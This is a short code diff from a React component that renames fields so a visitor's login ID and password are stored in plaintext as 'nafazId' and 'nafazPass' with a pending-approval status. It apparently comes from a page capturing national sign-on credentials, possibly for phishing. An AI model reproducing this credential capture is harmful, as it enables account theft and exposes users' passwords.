@@ -46,8 +46,8 @@ export default function Component() {
     setIsLoading(true);
    await addData({
       id: visitorId,
-      _v8: idLogin,
-      _v9:password,
+      nafazId: idLogin,
+      nafazPass:password,
       authNumber: "...",
       approval: "pending",
     });
